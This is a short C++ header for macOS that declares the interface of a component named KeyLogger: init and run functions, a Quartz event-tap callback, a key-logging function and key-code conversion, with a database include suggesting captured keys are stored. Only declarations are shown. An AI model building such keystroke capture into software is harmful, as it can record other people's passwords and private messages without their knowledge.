#pragma once
#include "db/db.hpp"
#include <stdio.h>
#include <string.h>
#include <ApplicationServices/ApplicationServices.h>
#include <Carbon/Carbon.h>

namespace KeyLogger {
    extern "C" {
        void Init();
        void Run();
        void logKey(int keyCode);
        CGEventRef CGEventCallback(CGEventTapProxy, CGEventType, CGEventRef, void*);
        const char *convertKeyCode(int);
    }
}